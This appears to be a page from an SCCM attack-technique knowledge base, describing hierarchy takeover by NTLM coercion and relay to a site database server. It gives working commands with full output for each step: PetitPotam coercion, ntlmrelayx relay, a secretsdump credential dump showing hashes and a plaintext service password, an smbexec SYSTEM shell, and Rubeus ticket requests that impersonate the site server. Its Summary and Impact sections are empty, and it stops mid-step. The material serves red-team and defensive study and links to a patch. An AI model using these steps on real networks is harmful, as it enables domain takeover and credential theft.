# TAKEOVER-2

## Description
Hierarchy takeover via NTLM coercion and relay to SMB on remote site database

## MITRE ATT&CK TTPs
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement

## Requirements
-

## Summary

## Impact

## Subtechniques
- TAKEOVER-2.1: Coerce primary site server
- TAKEOVER-2.2: Coerce passive site server

## Defensive IDs
- [PREVENT-1: Patch SCCM Site Server with KB15599094](../defense-techniques/PREVENT/PREVENT-1/prevent-1_description.md)

## Examples
The steps to execute TAKEOVER-2.1 and TAKEOVER-2.2 are the same except that a different system is targeted for coercion of NTLM authentication.

1. On the attacker relay server, start `ntlmrelayx`, targeting the IP address of the site database server and starting a SOCKS proxy:

```
# impacket-ntlmrelayx -smb2support -ts -ip 192.168.57.130 -t 192.168.57.31 -socks
Impacket v0.11.0 - Copyright 2023 Fortra

[2024-03-01 12:51:57] [*] Protocol Client MSSQL loaded..
[2024-03-01 12:51:57] [*] Protocol Client LDAPS loaded..
[2024-03-01 12:51:57] [*] Protocol Client LDAP loaded..
[2024-03-01 12:51:57] [*] Protocol Client RPC loaded..
[2024-03-01 12:51:57] [*] Protocol Client HTTP loaded..
[2024-03-01 12:51:57] [*] Protocol Client HTTPS loaded..
[2024-03-01 12:51:57] [*] Protocol Client IMAPS loaded..
[2024-03-01 12:51:57] [*] Protocol Client IMAP loaded..
[2024-03-01 12:51:57] [*] Protocol Client SMTP loaded..
[2024-03-01 12:51:57] [*] Protocol Client SMB loaded..
[2024-03-01 12:51:57] [*] Protocol Client DCSYNC loaded..
[2024-03-01 12:51:58] [*] Running in relay mode to single host
[2024-03-01 12:51:58] [*] SOCKS proxy started. Listening at port 1080
[2024-03-01 12:51:58] [*] HTTPS Socks Plugin loaded..
[2024-03-01 12:51:58] [*] HTTP Socks Plugin loaded..
[2024-03-01 12:51:58] [*] MSSQL Socks Plugin loaded..
[2024-03-01 12:51:58] [*] IMAP Socks Plugin loaded..
[2024-03-01 12:51:58] [*] SMB Socks Plugin loaded..
[2024-03-01 12:51:58] [*] SMTP Socks Plugin loaded..
[2024-03-01 12:51:58] [*] IMAPS Socks Plugin loaded..
[2024-03-01 12:51:58] [*] Setting up SMB Server
[2024-03-01 12:51:58] [*] Setting up HTTP Server on port 80
[2024-03-01 12:51:58] [*] Setting up WCF Server
[2024-03-01 12:51:58] [*] Setting up RAW Server on port 6666
```

2. Coerce authentication from the site server's domain computer account:

```
# python3 PetitPotam.py -d MAYYHEM.LOCAL -u lowpriv -p P@ssw0rd 192.168.57.130 192.168.57.50 

Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.57.50[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Observe that a connection is received on the relay server and a SOCKS proxy the site database server is started with the relayed credentials:

```
[2024-03-01 12:53:19] [*] SMBD-Thread-11 (process_request_thread): Received connection from 192.168.57.50, attacking target smb://192.168.57.31
[2024-03-01 12:53:19] [*] Authenticating against smb://192.168.57.31 as MAYYHEM/SITE-SERVER$ SUCCEED
[2024-03-01 12:53:19] [*] SOCKS: Adding MAYYHEM/SITE-SERVER$@192.168.57.31(445) to active SOCKS connection. Enjoy
[2024-03-01 12:53:19] [*] SMBD-Thread-12 (process_request_thread): Connection from 192.168.57.50 controlled, but there are no more targets left!
[2024-03-01 12:53:19] [*] SMBD-Thread-13 (process_request_thread): Connection from 192.168.57.50 controlled, but there are no more targets left!
[2024-03-01 12:53:19] [*] SMBD-Thread-14 (process_request_thread): Connection from 192.168.57.50 controlled, but there are no more targets left!
[2024-03-01 12:53:19] [*] SMBD-Thread-15 (process_request_thread): Connection from 192.168.57.50 controlled, but there are no more targets left!

ntlmrelayx> socks
Protocol  Target         Username              AdminStatus  Port 
--------  -------------  --------------------  -----------  ----
SMB       192.168.57.31  MAYYHEM/SITE-SERVER$  TRUE         445 
```

3. Proxy in secretsdump to obtain credentials for the MSSQL database, which may be running as `LocalSystem` or a domain service account:

```
# proxychains impacket-secretsdump MAYYHEM/SITE-SERVER\$@192.168.57.31
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.57.31:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xc572...b524
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19c...ef42:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6...89c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6...089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2b07...31bd:::
[*] Dumping cached domain logon information (domain/username:hash)
MAYYHEM.LOCAL/sccmadmin:$DCC2$10240#sccmadmin#9c5f...8b48: (2024-02-29 18:49:56)
MAYYHEM.LOCAL/Administrator:$DCC2$10240#Administrator#dfb3...dc42: (2024-02-24 18:21:18)
MAYYHEM.LOCAL/sqlsvc:$DCC2$10240#sqlsvc#e1286...346c: (2024-03-01 17:23:29)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
MAYYHEM\SITE3-DB$:aes256-cts-hmac-sha1-96:0079...ba03
MAYYHEM\SITE3-DB$:aes128-cts-hmac-sha1-96:2d8e...3068
MAYYHEM\SITE3-DB$:des-cbc-md5:83f1...7ca4
MAYYHEM\SITE3-DB$:plain_password_hex:6100...6d00
MAYYHEM\SITE3-DB$:aad3b435b51404eeaad3b435b51404ee:1eca...baf0:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xf470...4a44
dpapi_userkey:0x09f0....7fcf
[*] NL$KM 
...
NL$KM:2978...b0c1
[*] _SC_MSSQLSERVER 
MAYYHEM\sqlsvc:P@ssw0rd
[*] _SC_SQLSERVERAGENT 
MAYYHEM\sqlsvc:P@ssw0rd
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

5. Get a shell/agent on the system as SYSTEM:

```
impacket-smbexec Administrator@SITE3-DB.MAYYHEM.LOCAL -hashes ad3b435b51404eeaad3b435b51404ee:e19c...ef42 
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

At this point, if the service is running in the context of `LocalSystem`, you can access the database to grant a user the `Full Administrator` role (see TAKEOVER-1). If the database is running in the context of a domain service account, further steps are needed.


### Windows

6. Identify the account running the sqlservr.exe service. In this example, the site database is running in the context of `MAYYHEM\sqlsvc`:

```
tasklist /v

Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title                                                            
========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================
System Idle Process              0 Services                   0          8 K Unknown         NT AUTHORITY\SYSTEM                                     0:12:41 N/A                                                                     
System                           4 Services                   0        148 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:28 N/A                                                                     
Registry                       100 Services                   0     75,140 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
smss.exe                       304 Services                   0      1,276 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
csrss.exe                      432 Services                   0      6,196 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
wininit.exe                    532 Services                   0      6,956 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
csrss.exe                      540 Console                    1      5,796 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
winlogon.exe                   604 Console                    1     11,036 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
services.exe                   660 Services                   0      9,396 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:02 N/A                                                                     
lsass.exe                      680 Services                   0     18,508 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:01 N/A                                                                     
svchost.exe                    776 Services                   0     14,552 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
fontdrvhost.exe                804 Services                   0      3,460 K Unknown         Font Driver Host\UMFD-0                                 0:00:00 N/A                                                                     
fontdrvhost.exe                812 Console                    1      3,372 K Unknown         Font Driver Host\UMFD-1                                 0:00:00 N/A                                                                     
svchost.exe                    888 Services                   0     10,384 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A                                                                     
svchost.exe                    944 Services                   0      7,368 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
LogonUI.exe                   1004 Console                    1     74,996 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
dwm.exe                        400 Console                    1    121,432 K Unknown         Window Manager\DWM-1                                    0:00:00 N/A                                                                     
svchost.exe                    940 Services                   0      5,936 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   1028 Services                   0      5,412 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   1040 Services                   0      6,840 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   1060 Services                   0      7,712 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   1128 Services                   0      9,336 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A                                                                     
svchost.exe                   1140 Services                   0      6,044 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   1148 Services                   0      8,332 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   1244 Services                   0      7,528 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   1268 Services                   0      6,680 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   1360 Services                   0     19,852 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   1384 Services                   0      7,112 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   1540 Services                   0     12,660 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A                                                                     
svchost.exe                   1548 Services                   0     17,376 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   1556 Services                   0     11,076 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   1676 Services                   0     14,992 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   1684 Services                   0     11,240 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   1696 Services                   0      9,220 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   1720 Services                   0      5,760 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   1824 Services                   0     10,720 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   1856 Services                   0      9,288 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   1892 Services                   0      8,920 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   1944 Services                   0      8,600 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   2020 Services                   0      9,808 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A                                                                     
svchost.exe                   1228 Services                   0      7,468 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   2096 Services                   0      7,732 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   2212 Services                   0     10,400 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   2224 Services                   0      8,312 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   2236 Services                   0      7,324 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A                                                                     
spoolsv.exe                   2392 Services                   0     16,392 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   2524 Services                   0      5,764 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   2552 Services                   0     10,260 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A                                                                     
svchost.exe                   2580 Services                   0     27,756 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:01 N/A                                                                     
svchost.exe                   2640 Services                   0      7,084 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   2652 Services                   0      5,520 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                   2684 Services                   0      8,744 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   2700 Services                   0     12,136 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
sqlwriter.exe                 2708 Services                   0      8,268 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   2728 Services                   0      6,660 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   2776 Services                   0      5,700 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
VGAuthService.exe             2788 Services                   0     11,968 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
vm3dservice.exe               2836 Services                   0      6,360 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
vmtoolsd.exe                  2848 Services                   0     22,816 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
MsMpEng.exe                   2864 Services                   0    122,044 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:04 N/A                                                                     
svchost.exe                   2876 Services                   0     28,664 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:04 N/A                                                                     
svchost.exe                   2904 Services                   0     12,916 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A                                                                     
wlms.exe                      2960 Services                   0      3,568 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   2988 Services                   0     10,956 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   2068 Services                   0     13,024 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
vm3dservice.exe               2376 Console                    1      6,488 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
AggregatorHost.exe            3452 Services                   0      4,596 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
dllhost.exe                   3500 Services                   0     14,268 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
WmiPrvSE.exe                  3716 Services                   0     19,176 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:05 N/A                                                                     
msdtc.exe                     3028 Services                   0     10,520 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A                                                                     
WmiPrvSE.exe                  4312 Services                   0     42,920 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:01 N/A                                                                     
svchost.exe                   4356 Services                   0     20,564 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
CcmExec.exe                   5076 Services                   0     49,404 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:01 N/A                                                                     
WmiPrvSE.exe                  2180 Services                   0     10,536 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   3596 Services                   0     11,388 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
msiexec.exe                   2428 Services                   0      9,040 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   4204 Services                   0     10,632 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   4088 Services                   0     12,728 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
svchost.exe                    672 Services                   0      5,856 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
sqlservr.exe                  4776 Services                   0    253,152 K Unknown         MAYYHEM\sqlsvc                                          0:00:01 N/A                                                                     
WmiPrvSE.exe                   560 Services                   0      8,956 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A                                                                     
sqlceip.exe                   4924 Services                   0     18,148 K Unknown         NT SERVICE\SQLTELEMETRY                                 0:00:00 N/A                                                                     
svchost.exe                   4884 Services                   0     10,952 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   2756 Services                   0     13,788 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   2760 Services                   0     12,140 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   3016 Services                   0      6,376 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
WmiPrvSE.exe                  2972 Services                   0     40,712 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   5036 Services                   0      9,384 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
svchost.exe                   4452 Services                   0     19,476 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
policyHost.exe                3228 Services                   0     13,456 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
WmiApSrv.exe                  1820 Services                   0      9,052 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
cmd.exe                       3668 Services                   0      3,932 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
cmd.exe                       3788 Services                   0      4,316 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
conhost.exe                   2980 Services                   0     12,976 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
tasklist.exe                  4908 Services                   0      8,800 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A 
```

7. Get the SPN for the database service account:

```
setspn -L sqlsvc
Registered ServicePrincipalNames for CN=SQL Service,CN=Users,DC=MAYYHEM,DC=LOCAL:
        MSSQLSvc/SITE3-DB.MAYYHEM.LOCAL:1433
        MSSQLSvc/SITE3-DB:1433
```

From another Windows system:

8. Get a TGT for the SQL service account running the site database:

```
.\Rubeus.exe asktgt /domain:MAYYHEM.LOCAL /user:sqlsvc /password:P@ssw0rd /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: E19CCF75EE54E06B06A5907AF13CEF42
[*] Building AS-REQ (w/ preauth) for: 'MAYYHEM.LOCAL\sqlsvc'
[*] Using domain controller: 192.168.57.100:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFdDCCBXCgAwIBBaEDAgEWooIEiDCCBIRhggSAMIIEfKADAgEFoQ8bDU1BWVlIRU0uTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDU1BWVlIRU0uTE9DQUyjggQ+MIIEOqADAgESoQMCAQKiggQsBIIEKLdcg3OmG5/v47h/u/swmeirjidkQJ8ndXG8ENds+MKZLhiKqcT1Q8o37wuZupaj8UZPgIDcwGlXi1cYrnFfvnQvZ8/EWTgMMs9ajk3eDcmyOBINC3mqDy6Cwwfm4jPuuxJpGUVgfBz6j0jabjAXhP0xZfHeBWa+ABUROtQIeaJ5sNT8BJat1nMVi97vBiC9Rxh8JfKypGTqXrcuhaaBmWquTb5I/+2tYfP03Sb22ddfIIKf2dUSf9rjuof6ttlmjrWgtDB8dkGCZYXzghkVCNZ0Jesag2qILMoOBjIDx4I2ijk88iNQmBjOgwJuhRmKoRYZAV03damrWzdY6sWCKtRlMagvOdWwz0NsX3nyV7NR5HSuKXIQzgRWeBYXgHrbEQgB8ga6b2yCOR6cNMuncTRTpkt91tHy7eLBtCHtVeBSTQyxojgKyVvcP2qP++RquYxQ/eOCOIjtp/wSopcudCA447Bm62/JxV3+VMXBvMviPZg0i+rQEgNyfdkE6ZThVRw3hk2oeLij+tCLqN7CPZ5fvbg4Petr3HLtEX7OH0v0xcjBxPGAsgAEh4iarhvkOHDJXrgbvj+40M1Gd3xfiBPXvcp7Lek3ndseuGdUA8B0iy+4QKNVmbkZubJ2OJVhmWJX9WbufcW/nIgh5KTX2RjU4d7clCxc8Zv0ZsjumtSSZHfRKjw3jRUBfjXLAwslMYM7HwwZCpp/+GXZduG8VewugrrUO6DGj87vGohpttjYeCH3+EN/uOOt0Xtz8DbfREwb1OKpS4bstWdyAyzrJm0BLY0Dr0XgG7wcz1WTJ5DWr2h6jHlYsWo4FWNNpB7kmVVhZz18hf+mB75/bqXhgRR4ja4xkqYk0KOHnUijgHxq2SNPW+XIIElnz2+ret/MsWiwq1wQz1WJjfHETgwcc1uMVL33yvwa7zyXpxGu0jl7m38mhZcuV1tR7Zm96y+s+Qg38M4AHNh+peu/EC55/EKrDX4g1hHrKvqMGfaO7QL39yQnYM/S90xoUDTZ7cKXQnRBeZZBRKCs/gEr8OnAqCqzXK39CbfOmtxGk2gi2ThB58Ptor1sc0U6hxvbfJi4M15N87zL2tjgepRqNOpudWB8yPqjhzca+hP/bvvSn7ks4zgS8H/kqzfSFL3TKEJhifkjpT3fQCxg4PMeSmyBZjj9QpOMCapn1QiSTYmMEqDCF5PU0kwEgFrxtEc5W+aUNbr6GLtwgC7GID92oySq1dMDgLyEanX4wsY1SQO7LHK+Iurr1DTLk5Qhc8ZW6kl+XvgEOoib/Dekhje++nnHuXuimNRbFjllJ4m0N8AbMY/3D4HDc3TWbxcUg/8lid3LQe/Mr3cqAGJjBzIXqelfLRtv7O438ffE6phoNcY2u1EyFY75ObXsiIkRBpuhWhkhvQvu/lGiH1k1o4HXMIHUoAMCAQCigcwEgcl9gcYwgcOggcAwgb0wgbqgGzAZoAMCARehEgQQu39YMInwN6CIRKRoZgf7RKEPGw1NQVlZSEVNLkxPQ0FMohMwEaADAgEBoQowCBsGc3Fsc3ZjowcDBQBA4QAApREYDzIwMjQwMzA1MTA1MjI2WqYRGA8yMDI0MDMwNTIwNTIyNlqnERgPMjAyNDAzMTIxMDUyMjZaqA8bDU1BWVlIRU0uTE9DQUypIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDU1BWVlIRU0uTE9DQUw=

  ServiceName              :  krbtgt/MAYYHEM.LOCAL
  ServiceRealm             :  MAYYHEM.LOCAL
  UserName                 :  sqlsvc (NT_PRINCIPAL)
  UserRealm                :  MAYYHEM.LOCAL
  StartTime                :  3/5/2024 2:52:26 AM
  EndTime                  :  3/5/2024 12:52:26 PM
  RenewTill                :  3/12/2024 3:52:26 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  u39YMInwN6CIRKRoZgf7RA==
  ASREP (key)              :  E19CCF75EE54E06B06A5907AF13CEF42
```

9. Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the primary site server:

```
Rubeus.exe s4u /impersonateuser:SITE-SERVER$ /altservice:MSSQLSvc/SITE3-DB.MAYYHEM.LOCAL:1433 /self /nowrap /ticket:doIFdDCCBXCgAwIBBaEDAgEWooIEiDCCBIRhggSAMIIEfKADAgEFoQ8bDU1BWVlIRU0uTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDU1BWVlIRU0uTE9DQUyjggQ+MIIEOqADAgESoQMCAQKiggQsBIIEKLdcg3OmG5/v47h/u/swmeirjidkQJ8ndXG8ENds+MKZLhiKqcT1Q8o37wuZupaj8UZPgIDcwGlXi1cYrnFfvnQvZ8/EWTgMMs9ajk3eDcmyOBINC3mqDy6Cwwfm4jPuuxJpGUVgfBz6j0jabjAXhP0xZfHeBWa+ABUROtQIeaJ5sNT8BJat1nMVi97vBiC9Rxh8JfKypGTqXrcuhaaBmWquTb5I/+2tYfP03Sb22ddfIIKf2dUSf9rjuof6ttlmjrWgtDB8dkGCZYXzghkVCNZ0Jesag2qILMoOBjIDx4I2ijk88iNQmBjOgwJuhRmKoRYZAV03damrWzdY6sWCKtRlMagvOdWwz0NsX3nyV7NR5HSuKXIQzgRWeBYXgHrbEQgB8ga6b2yCOR6cNMuncTRTpkt91tHy7eLBtCHtVeBSTQyxojgKyVvcP2qP++RquYxQ/eOCOIjtp/wSopcudCA447Bm62/JxV3+VMXBvMviPZg0i+rQEgNyfdkE6ZThVRw3hk2oeLij+tCLqN7CPZ5fvbg4Petr3HLtEX7OH0v0xcjBxPGAsgAEh4iarhvkOHDJXrgbvj+40M1Gd3xfiBPXvcp7Lek3ndseuGdUA8B0iy+4QKNVmbkZubJ2OJVhmWJX9WbufcW/nIgh5KTX2RjU4d7clCxc8Zv0ZsjumtSSZHfRKjw3jRUBfjXLAwslMYM7HwwZCpp/+GXZduG8VewugrrUO6DGj87vGohpttjYeCH3+EN/uOOt0Xtz8DbfREwb1OKpS4bstWdyAyzrJm0BLY0Dr0XgG7wcz1WTJ5DWr2h6jHlYsWo4FWNNpB7kmVVhZz18hf+mB75/bqXhgRR4ja4xkqYk0KOHnUijgHxq2SNPW+XIIElnz2+ret/MsWiwq1wQz1WJjfHETgwcc1uMVL33yvwa7zyXpxGu0jl7m38mhZcuV1tR7Zm96y+s+Qg38M4AHNh+peu/EC55/EKrDX4g1hHrKvqMGfaO7QL39yQnYM/S90xoUDTZ7cKXQnRBeZZBRKCs/gEr8OnAqCqzXK39CbfOmtxGk2gi2ThB58Ptor1sc0U6hxvbfJi4M15N87zL2tjgepRqNOpudWB8yPqjhzca+hP/bvvSn7ks4zgS8H/kqzfSFL3TKEJhifkjpT3fQCxg4PMeSmyBZjj9QpOMCapn1QiSTYmMEqDCF5PU0kwEgFrxtEc5W+aUNbr6GLtwgC7GID92oySq1dMDgLyEanX4wsY1SQO7LHK+Iurr1DTLk5Qhc8ZW6kl+XvgEOoib/Dekhje++nnHuXuimNRbFjllJ4m0N8AbMY/3D4HDc3TWbxcUg/8lid3LQe/Mr3cqAGJjBzIXqelfLRtv7O438ffE6phoNcY2u1EyFY75ObXsiIkRBpuhWhkhvQvu/lGiH1k1o4HXMIHUoAMCAQCigcwEgcl9gcYwgcOggcAwgb0wgbqgGzAZoAMCARehEgQQu39YMInwN6CIRKRoZgf7RKEPGw1NQVlZSEVNLkxPQ0FMohMwEaADAgEBoQowCBsGc3Fsc3ZjowcDBQBA4QAApREYDzIwMjQwMzA1MTA1MjI2WqYRGA8yMDI0MDMwNTIwNTIyNlqnERgPMjAyNDAzMTIxMDUyMjZaqA8bDU1BWVlIRU0uTE9DQUypIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDU1BWVlIRU0uTE9DQUw=

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'sqlsvc@MAYYHEM.LOCAL'
[*] Using domain controller: DC.MAYYHEM.LOCAL (192.168.57.100)
[*] Sending S4U2self request to 192.168.57.100:88
[+] S4U2self success!
[*] Substituting alternative service name 'MSSQLSvc/SITE3-DB.MAYYHEM.LOCAL:1433'
[*] Got a TGS for 'SITE-SERVER$' to 'MSSQLSvc@MAYYHEM.LOCAL'
[*] base64(ticket.kirbi):

